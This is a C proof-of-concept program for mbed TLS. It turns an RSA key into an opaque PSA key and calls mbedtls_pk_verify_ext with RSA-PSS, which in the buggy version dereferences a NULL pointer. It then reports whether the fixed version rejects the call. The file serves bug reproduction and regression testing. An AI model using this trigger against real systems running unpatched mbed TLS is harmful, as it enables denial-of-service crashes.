#include <stdio.h>
#include <string.h>

#include "mbedtls/pk.h"
#include "mbedtls/rsa.h"
#include "mbedtls/md.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "psa/crypto.h"

#define KEY_BITS 1024
#define HASH_LEN 32

int main(void)
{
    int ret = 0;
    psa_status_t status;

    mbedtls_pk_context pk;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;

    psa_key_attributes_t key_attr = PSA_KEY_ATTRIBUTES_INIT;
    mbedtls_svc_key_id_t key_id = MBEDTLS_SVC_KEY_ID_INIT;

    unsigned char hash[HASH_LEN];
    unsigned char sig[512];
    size_t sig_len = 0;

    const char *pers = "poc_pk_verify_ext";

    mbedtls_pk_rsassa_pss_options pss_opts;
    pss_opts.mgf1_hash_id = MBEDTLS_MD_SHA256;
    pss_opts.expected_salt_len = MBEDTLS_RSA_SALT_LEN_ANY;

    memset(hash, 0x2a, sizeof(hash));
    memset(sig, 0, sizeof(sig));

    mbedtls_pk_init(&pk);
    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                                mbedtls_entropy_func,
                                &entropy,
                                (const unsigned char *) pers,
                                strlen(pers));
    if (ret != 0) {
        printf("ctr_drbg_seed failed: %d\n", ret);
        goto cleanup;
    }

    status = psa_crypto_init();
    if (status != PSA_SUCCESS) {
        printf("psa_crypto_init failed: %d\n", (int) status);
        ret = 2;
        goto cleanup;
    }

    /*
     * Step 1: create a legacy RSA key in a PK context.
     */
    ret = mbedtls_pk_setup(&pk, mbedtls_pk_info_from_type(MBEDTLS_PK_RSA));
    if (ret != 0) {
        printf("mbedtls_pk_setup failed: %d\n", ret);
        goto cleanup;
    }

    ret = mbedtls_rsa_gen_key(mbedtls_pk_rsa(pk),
                              mbedtls_ctr_drbg_random,
                              &ctr_drbg,
                              KEY_BITS,
                              65537);
    if (ret != 0) {
        printf("mbedtls_rsa_gen_key failed: %d\n", ret);
        goto cleanup;
    }

    /*
     * Step 2: import the key into PSA and turn the PK context into an opaque key.
     */
    ret = mbedtls_pk_get_psa_attributes(&pk, PSA_KEY_USAGE_SIGN_HASH, &key_attr);
    if (ret != 0) {
        printf("mbedtls_pk_get_psa_attributes failed: %d\n", ret);
        goto cleanup;
    }

    ret = mbedtls_pk_import_into_psa(&pk, &key_attr, &key_id);
    if (ret != 0) {
        printf("mbedtls_pk_import_into_psa failed: %d\n", ret);
        goto cleanup;
    }

    mbedtls_pk_free(&pk);
    mbedtls_pk_init(&pk);

    ret = mbedtls_pk_setup_opaque(&pk, key_id);
    if (ret != 0) {
        printf("mbedtls_pk_setup_opaque failed: %d\n", ret);
        goto cleanup;
    }

    printf("opaque pk type = %d\n", (int) mbedtls_pk_get_type(&pk));

    /*
     * Step 3: sign using the opaque key.
     */
    ret = mbedtls_pk_sign_ext(MBEDTLS_PK_RSASSA_PSS,
                              &pk,
                              MBEDTLS_MD_SHA256,
                              hash,
                              sizeof(hash),
                              sig,
                              sizeof(sig),
                              &sig_len,
                              mbedtls_ctr_drbg_random,
                              &ctr_drbg);
    if (ret != 0) {
        printf("mbedtls_pk_sign_ext failed: %d\n", ret);
        goto cleanup;
    }

    printf("signature length = %zu\n", sig_len);

    /*
     * Step 4: trigger.
     *
     * Buggy version:
     *   mbedtls_pk_verify_ext() enters RSA-PSS path, calls mbedtls_pk_rsa(*ctx),
     *   gets NULL for opaque context, then dereferences it.
     *
     * Fixed version:
     *   returns MBEDTLS_ERR_PK_FEATURE_UNAVAILABLE.
     */
    printf("calling mbedtls_pk_verify_ext...\n");

    ret = mbedtls_pk_verify_ext(MBEDTLS_PK_RSASSA_PSS,
                                &pss_opts,
                                &pk,
                                MBEDTLS_MD_SHA256,
                                hash,
                                sizeof(hash),
                                sig,
                                sig_len);

    printf("verify_ext ret=%d\n", ret);
    printf("expected fixed ret=%d\n", MBEDTLS_ERR_PK_FEATURE_UNAVAILABLE);

    if (ret == MBEDTLS_ERR_PK_FEATURE_UNAVAILABLE) {
        printf("[OK] fixed behavior: unsupported opaque verify_ext rejected safely.\n");
    } else {
        printf("[INFO] returned without crash, ret=%d\n", ret);
    }

cleanup:
    mbedtls_pk_free(&pk);

    if (!mbedtls_svc_key_id_is_null(key_id)) {
        psa_destroy_key(key_id);
    }

    mbedtls_ctr_drbg_free(&ctr_drbg);
    mbedtls_entropy_free(&entropy);
    mbedtls_psa_crypto_free();

    return 0;
}
